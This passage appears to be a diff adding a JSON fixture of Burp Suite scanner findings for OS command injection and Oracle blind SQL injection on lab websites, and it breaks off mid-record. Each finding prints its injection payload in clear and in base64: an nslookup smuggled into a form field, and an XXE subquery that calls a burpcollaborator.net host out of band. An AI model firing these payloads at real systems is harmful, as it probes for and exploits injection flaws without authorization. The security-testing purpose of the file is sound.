@@ -1,0 +1,954 @@
+[
+  {
+    "name": "OS command injection",
+    "type_index": 1048832,
+    "serial_number": "1291348959150136320",
+    "origin": "https://insecure-website.com",
+    "path": "/feedback/submit",
+    "severity": "high",
+    "confidence": "certain",
+    "description": "The <b>subject<\/b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses. However, it is possible to cause the application to interact with an external domain, to verify that a command was executed.<br><br>The payload <b>&amp;nslookup -q=cname dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net.&amp;'\\\"`0&amp;nslookup -q=cname dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net.&amp;`'<\/b> was submitted in the subject parameter. The application performed a DNS lookup for the specified domain name.",
+    "caption": "/feedback/submit [subject parameter]",
+    "evidence": [
+      {
+        "type": "CollaboratorEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "Jm5zbG9va3VwIC1xPWNuYW1lIGRyOGVvZXNsOGUwcmxvOWdldWdidmdqd2tucWdlNjIxcXRkbTFiLmJ1cnBjb2xsYWJvcmF0b3IubmV0LiYnXCJgMCZuc2xvb2t1cCAtcT1jbmFtZSBkcjhlb2VzbDhlMHJsbzlnZXVnYnZnandrbnFnZTYyMXF0ZG0xYi5idXJwY29sbGFib3JhdG9yLm5ldC4mYCc=",
+            "flags": 18
+          },
+          "band_flags": [
+            "out_of_band"
+          ]
+        },
+        "request_response": {
+          "url": "https://insecure-website.com/feedback/submit",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "UE9TVCAvZmVlZGJhY2svc3VibWl0IEhUVFAvMS4xDQpIb3N0OiBpbnNlY3VyZS13ZWJzaXRlLmNvbQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTAuMTQ7IHJ2OjY3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjcuMA0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KUmVmZXJlcjogaHR0cHM6Ly9pbnNlY3VyZS13ZWJzaXRlLmNvbS9mZWVkYmFjaw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA5NQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvb2tpZTogc2Vzc2lvbj01QVpucDdGdkE2Y054MTZNTXp3YTNpM0xET0FZNHB2Wg0KDQpjc3JmPUFnUGNxOGgzN2N2MkZ0Z2xSajRQb2R6dnVFWU9DZUV6Jm5hbWU9dGVzdCZlbWFpbD10ZXN0JTQwdGVzdC5jb20mc3ViamVjdD10ZXN0",
+              "length": 504
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "JTI2bnNsb29rdXAlMjAtcSUzZGNuYW1lJTIwZHI4ZW9lc2w4ZTBybG85Z2V1Z2J2Z2p3a25xZ2U2MjFxdGRtMWIuYnVycGNvbGxhYm9yYXRvci5uZXQuJTI2JyU1YyUyMiU2MDAlMjZuc2xvb2t1cCUyMC1xJTNkY25hbWUlMjBkcjhlb2VzbDhlMHJsbzlnZXVnYnZnandrbnFnZTYyMXF0ZG0xYi5idXJwY29sbGFib3JhdG9yLm5ldC4lMjYlNjAn",
+              "length": 195
+            },
+            {
+              "type": "DataSegment",
+              "data": "Jm1lc3NhZ2U9dGVzdA==",
+              "length": 13
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561021129687"
+        },
+        "dns_event": {
+          "query_type": 5,
+          "domain": "dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net",
+          "query": "bN0AEAABAAAAAAABJmRyOGVvZXNsOGUwcmxvOWdldWdidmdqd2tucWdlNjIxcXRkbTFiEGJ1cnBjb2xsYWJvcmF0b3IDbmV0AAAFAAEAACkQAAAAgAAAAA==",
+          "time_stamp": "2019-Jun-20 08:58:14 UTC",
+          "time_between_sending_payload_and_receiving_interaction": "0",
+          "source_ip_address": "54.229.136.232",
+          "source_port": 53,
+          "type": "dns",
+          "interaction_id": "dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b",
+          "description": "The Collaborator server received a DNS lookup of type CNAME for the domain name <b>dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net<\/b>.<br><br> The lookup was received from IP address 54.229.136.232 at 2019-Jun-20 08:58:14 UTC."
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MTgsInZhcmlhbnQiOjEsImluc2VydGlvbl9wb2ludF9rZXkiOiIyeDMiLCJpbnNlcnRpb25fcG9pbnRfaWRlbnRpZmllcnMiOlt7InR5cGVfaW5kZXgiOjQwOTcsIm5hbWUiOiJzdWJqZWN0In1dLCJpc3N1ZV9kZXRhaWxzX21hcCI6e319"
+  },
+  {
+    "name": "SQL injection",
+    "type_index": 1049088,
+    "serial_number": "1463035246293893120",
+    "origin": "https://vulnerable-website.com",
+    "path": "/",
+    "severity": "high",
+    "confidence": "certain",
+    "description": "The <b>TrackingId<\/b> cookie appears to be vulnerable to SQL injection attacks. The payload <b>'||(select extractvalue(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % waqks SYSTEM \"http://pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollab'||'orator.net/\"&gt;%waqks;]&gt;'),'/l') from dual)||'<\/b> was submitted in the TrackingId cookie. This payload injects a SQL sub-query that calls Oracle's xmltype function to evaluate some data as XML. The supplied XML defines an external entity that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br>The database appears to be Oracle.",
+    "caption": "/ [TrackingId cookie]",
+    "evidence": [
+      {
+        "type": "CollaboratorEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "J3x8KHNlbGVjdCBleHRyYWN0dmFsdWUoeG1sdHlwZSgnPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcm9vdCBbIDwhRU5USVRZICUgd2Fxa3MgU1lTVEVNICJodHRwOi8vcG1mcWpxbngzcXYzZzA0czk2Ym5xc2U4ZnpsczlteHFsajg5d3kuYnVycGNvbGxhYid8fCdvcmF0b3IubmV0LyI+JXdhcWtzO10+JyksJy9sJykgZnJvbSBkdWFsKXx8Jw==",
+            "flags": 512
+          },
+          "band_flags": [
+            "out_of_band"
+          ]
+        },
+        "request_response": {
+          "url": "https://vulnerable-website.com/",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHZ1bG5lcmFibGUtd2Vic2l0ZS5jb20NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE0OyBydjo2Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY3LjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNClJlZmVyZXI6IGh0dHBzOi8vdnVsbmVyYWJsZS13ZWJzaXRlLmNvbS9wcm9kdWN0P3Byb2R1Y3RJZD02DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBUcmFja2luZ0lkPTM4ZmFCRTFOVUtUSzRlWUk=",
+              "length": 395
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "JyU3YyU3YyhzZWxlY3QlMjBleHRyYWN0dmFsdWUoeG1sdHlwZSgnJTNjJTNmeG1sJTIwdmVyc2lvbiUzZCUyMjEuMCUyMiUyMGVuY29kaW5nJTNkJTIyVVRGLTglMjIlM2YlM2UlM2MhRE9DVFlQRSUyMHJvb3QlMjBbJTIwJTNjIUVOVElUWSUyMCUyNSUyMHdhcWtzJTIwU1lTVEVNJTIwJTIyaHR0cCUzYSUyZiUyZnBtZnFqcW54M3F2M2cwNHM5NmJucXNlOGZ6bHM5bXhxbGo4OXd5LmJ1cnBjb2xsYWInJTdjJTdjJ29yYXRvci5uZXQlMmYlMjIlM2UlMjV3YXFrcyUzYl0lM2UnKSUyYyclMmZsJyklMjBmcm9tJTIwZHVhbCklN2MlN2Mn",
+              "length": 303
+            },
+            {
+              "type": "DataSegment",
+              "data": "OyBzZXNzaW9uPXBRUjk0WmRMa2pUbmg2VnZJb3ZBZlppN3lxck5yandBDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCg==",
+              "length": 76
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEwOjIxOjU4IEdNVA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNCkNvbnRlbnQtTGVuZ3RoOiAxMDE0Mw0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtU2VjdXJpdHktUG9saWN5OiBkZWZhdWx0LXNyYyAnc2VsZic7IHNjcmlwdC1zcmMgJ3NlbGYnOyBpbWctc3JjICdzZWxmJzsgc3R5bGUtc3JjICdzZWxmJzsgZnJhbWUtc3JjICdzZWxmJzsgY29ubmVjdC1zcmMgJ3NlbGYnIHdzOi8vbG9jYWxob3N0OjMzMzM7IGZvbnQtc3JjICdzZWxmJzsgbWVkaWEtc3JjICdzZWxmJzsgb2JqZWN0LXNyYyAnbm9uZSc7IGNoaWxkLXNyYyAnc2VsZicgYmxvYjoNClgtQ29udGVudC1UeXBlLU9wdGlvbnM6IG5vc25pZmYNClgtWFNTLVByb3RlY3Rpb246IDE7IG1vZGU9YmxvY2sNClgtRnJhbWUtT3B0aW9uczogREVOWQ0KDQo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8bGluayBocmVmPSIvcmVzb3VyY2VzL2Nzcy9sYWJzRWNvbW1lcmNlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgICAgICA8dGl0bGU+QmxpbmQgU1FMIGluamVjdGlvbiB3aXRoIG91dC1vZi1iYW5kIGludGVyYWN0aW9uPC90aXRsZT4KICAgIDwvaGVhZD4KICAgIDxib2R5Pg==",
+              "length": 661
+            },
+            {
+              "type": "DataSegment",
+              "data": "CiAgICAgICAgPGRpdiB0aGVtZT0iZWNvbW1lcmNlIj4KICAgICAgICAgICAgPGRpdiBpZD0ibGFiSGVhZGVyIj4KICAgICAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJwYWdlSGVhZGVyIGlzLXNvbHZlZCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9yZXNvdXJjZXMvaW1hZ2VzL2xvZ29BY2FkZW15LnN2ZyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRpdGxlLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDI+QmxpbmQgU1FMIGluamVjdGlvbiB3aXRoIG91dC1vZi1iYW5kIGludGVyYWN0aW9uPC9oMj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsaW5rLWJhY2siIGhyZWY9Imh0dHBzOi8vcG9ydHN3aWdnZXIubmV0L3dlYi1zZWN1cml0eS9zcWwtaW5qZWN0aW9uL2JsaW5kL2xhYi1vdXQtb2YtYmFuZCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFjayB0byBsYWIgZGVzY3JpcHRpb24gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDI4IDMwIiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCAyOCAzMCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgdGl0bGU9ImJhY2stYXJyb3ciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMS40LDAgMCwxLjIgMTIuNiwxNSAwLDI4LjggMS40LDMwIDE1LjEsMTUiPjwvcG9seWdvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTQuMywwIDEyLjksMS4yIDI1LjYsMTUgMTIuOSwyOC44IDE0LjMsMzAgMjgsMTUiPjwvcG9seWdvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9nPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3ZnPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0id2lkZ2V0Y29udGFpbmVyLWxhYi1zdGF0dXMgaXMtc29sdmVkIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPkxBQjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwPlNvbHZlZDwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJsYWItc3RhdHVzLWljb24iPjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgICAgICAgICA8c2VjdGlvbiBpZD0ibm90aWZpY2F0aW9uLWxhYnNvbHZlZCIgY2xhc3M9Im5vdGlmaWNhdGlvbi1sYWJzb2x2ZWQiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxoND5Db25ncmF0dWxhdGlvbnMsIHlvdSBzb2x2ZWQgdGhlIGxhYiE8L2g0PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iaHR0cHM6Ly90d2l0dGVyLmNvbS9pbnRlbnQvdHdlZXQ/dGV4dD1JK2NvbXBsZXRlZCt0aGUrV2ViK1NlY3VyaXR5K0FjYWRlbXkrbGFiJTNhJTBhQmxpbmQrU1FMK2luamVjdGlvbit3aXRoK291dC1vZi1iYW5kK2ludGVyYWN0aW9uJTBhJTBhQFdlYlNlY0FjYWRlbXklMGEmdXJsPWh0dHBzJTNhJTJmJTJmcG9ydHN3aWdnZXIubmV0JTJmd2ViLXNlY3VyaXR5JTJmc3FsLWluamVjdGlvbiUyZmJsaW5kJTJmbGFiLW91dC1vZi1iYW5kJnJlbGF0ZWQ9V2ViU2VjQWNhZGVteSxCdXJwX1N1aXRlIj4KICAgICAgICAgICAgICAgIDxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMjAuNDQiIGhlaWdodD0iMTcuNzIiIHZpZXdCb3g9IjAgMCAyMC40NCAxNy43MiI+CiAgICAgICAgICAgICAgICAgICAgPHRpdGxlPnR3aXR0ZXItYnV0dG9uPC90aXRsZT4KICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMCwxNS44NWMxMS41MSw1LjUyLDE4LjUxLTIsMTguNzEtMTIuMjQuMy0uMjQsMS43My0xLjI0LDEuNzMtMS4yNEgxOC42OGwxLjQzLTItMi43NCwxYTQuMDksNC4wOSwwLDAsMC01LS44NGMtMy4xMywxLjQ0LTIuMTMsNC45NC0yLjEzLDQuOTRTNi4zOCw2LjIxLDEuNzYsMWMtMS4zOSwxLjU2LDAsNS4zOS42Nyw1LjczQzIuMTgsNywuNjYsNi40LjY2LDUuOS0uMDcsOS4zNiwzLjE0LDEwLjU0LDQsMTAuNzJhMi4zOSwyLjM5LDAsMCwxLTIuMTguMDhjLS4wOSwxLjEsMi45NCwzLjMzLDQuMTEsMy4yN0ExMC4xOCwxMC4xOCwwLDAsMSwwLDE1Ljg1WiI+PC9wYXRoPgogICAgICAgICAgICAgICAgPC9zdmc+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2hhcmUgeW91ciBza2lsbHMhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL3BvcnRzd2lnZ2VyLm5ldC93ZWItc2VjdXJpdHkvc3FsLWluamVjdGlvbi9ibGluZC9sYWItb3V0LW9mLWJhbmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnRpbnVlIGxlYXJuaW5nIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iTGF5ZXJfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHZpZXdCb3g9IjAgMCAyOCAzMCIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwIDAgMjggMzAiIHhtbDpzcGFjZT0icHJlc2VydmUiIHRpdGxlPSJiYWNrLWFycm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGc+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBwb2ludHM9IjEuNCwwIDAsMS4yIDEyLjYsMTUgMCwyOC44IDEuNCwzMCAxNS4xLDE1Ij48L3BvbHlnb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE0LjMsMCAxMi45LDEuMiAyNS42LDE1IDEyLjksMjguOCAxNC4zLDMwIDI4LDE1Ij48L3BvbHlnb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8c2NyaXB0IHNyYz0iL3Jlc291cmNlcy9qcy9sYWJIZWFkZXIuanMiPjwvc2NyaXB0PgogICAgICAgICAgICA8c2VjdGlvbiBjbGFzcz0ibWFpbmNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJ0b3AtbGlua3MiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIvbG9naW4iPkFjY291bnQgbG9naW48L2E+IHwKICAgICAgICAgICAgICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgICAgICAgICAgICAgPHNlY3Rpb24gY2xhc3M9ImVjb21zLXBhZ2VoZWFkZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3Jlc291cmNlcy9pbWFnZXMvc2hvcC5zdmciPgogICAgICAgICAgICAgICAgICAgIDwvc2VjdGlvbj4KICAgICAgICAgICAgICAgICAgICA8c2VjdGlvbiBjbGFzcz0ic2VhcmNoLWZpbHRlcnMiPgogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWw+UmVmaW5lIHlvdXIgc2VhcmNoOjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii8iPkFsbDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iL2ZpbHRlcj9jYXRlZ29yeT1DbG90aGluZyUyYytzaG9lcythbmQrYWNjZXNzb3JpZXMiPkNsb3RoaW5nLCBzaG9lcyBhbmQgYWNjZXNzb3JpZXM8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii9maWx0ZXI/Y2F0ZWdvcnk9Q29ycG9yYXRlK2dpZnRzIj5Db3Jwb3JhdGUgZ2lmdHM8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii9maWx0ZXI/Y2F0ZWdvcnk9Rm9vZCslMjYrRHJpbmsiPkZvb2QgJiBEcmluazwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iL2ZpbHRlcj9jYXRlZ29yeT1HaWZ0cyI+R2lmdHM8L2E+CiAgICAgICAgICAgICAgICAgICAgPC9zZWN0aW9uPgo8c2VjdGlvbiBjbGFzcz0iY29udGFpbmVyLWxpc3QtdGlsZXMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlL2NvbnRlbnQvcHJvZHVjdGNhdGFsb2cvcHJvZHVjdHMvMjcuanBnIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDM+VGhlIFRyb2xsZXktT048L2gzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvcmVzb3VyY2VzL2ltYWdlcy9yYXRpbmdGb3VyLnBuZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJDkwLjQwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iL3Byb2R1Y3Q/cHJvZHVjdElkPTYiPlZpZXcgZGV0YWlsczwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlL2NvbnRlbnQvcHJvZHVjdGNhdGFsb2cvcHJvZHVjdHMvNzIuanBnIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDM+QmFieSBNaW5kaW5nIFNob2VzPC9oMz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3Jlc291cmNlcy9pbWFnZXMvcmF0aW5nRm91ci5wbmciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQ4My4xMgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9Ii9wcm9kdWN0P3Byb2R1Y3RJZD0xMSI+VmlldyBkZXRhaWxzPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvaW1hZ2UvY29udGVudC9wcm9kdWN0Y2F0YWxvZy9wcm9kdWN0cy82Ni5qcGciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoMz5QYWRkbGluZyBQb29sIFNob2VzPC9oMz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3Jlc291cmNlcy9pbWFnZXMvcmF0aW5nRml2ZS5wbmciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQ1NS4zNwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9Ii9wcm9kdWN0P3Byb2R1Y3RJZD0xNiI+VmlldyBkZXRhaWxzPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvaW1hZ2UvY29udGVudC9wcm9kdWN0Y2F0YWxvZy9wcm9kdWN0cy8zNy5qcGciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoMz5UaGUgR2lhbnQgRW50ZXIgS2V5PC9oMz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3Jlc291cmNlcy9pbWFnZXMvcmF0aW5nVHdvLnBuZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJDcwLjg5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iL3Byb2R1Y3Q/cHJvZHVjdElkPTgiPlZpZXcgZGV0YWlsczwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlL2NvbnRlbnQvcHJvZHVjdGNhdGFsb2cvcHJvZHVjdHMvOC5qcGciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoMz5Gb2xkaW5nIEdhZGdldHM8L2gzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvcmVzb3VyY2VzL2ltYWdlcy9yYXRpbmdGb3VyLnBuZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJDE1LjQyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iL3Byb2R1Y3Q/cHJvZHVjdElkPTEzIj5WaWV3IGRldGFpbHM8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9pbWFnZS9jb250ZW50L3Byb2R1Y3RjYXRhbG9nL3Byb2R1Y3RzLzU4LmpwZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgzPlRoZXJlIGlzIE5vICZhcG9zO0kmYXBvczsgaW4gVGVhbTwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9yZXNvdXJjZXMvaW1hZ2VzL3JhdGluZ1RocmVlLnBuZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJDg5LjAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iL3Byb2R1Y3Q/cHJvZHVjdElkPTE4Ij5WaWV3IGRldGFpbHM8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9pbWFnZS9jb250ZW50L3Byb2R1Y3RjYXRhbG9nL3Byb2R1Y3RzLzQ4LmpwZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgzPkJCUSBTdWl0Y2FzZTwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9yZXNvdXJjZXMvaW1hZ2VzL3JhdGluZ0ZvdXIucG5nIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkODUuNzIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSIvcHJvZHVjdD9wcm9kdWN0SWQ9NyI+VmlldyBkZXRhaWxzPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvaW1hZ2UvY29udGVudC9wcm9kdWN0Y2F0YWxvZy9wcm9kdWN0cy8xLmpwZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgzPkVnZ3Rhc3RpYywgRnVuLCBGb29kIEVnZ2Nlc3NvcmllczwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9yZXNvdXJjZXMvaW1hZ2VzL3JhdGluZ1R3by5wbmciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQ1LjA1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iL3Byb2R1Y3Q/cHJvZHVjdElkPTEyIj5WaWV3IGRldGFpbHM8L2E+CiAgICAgI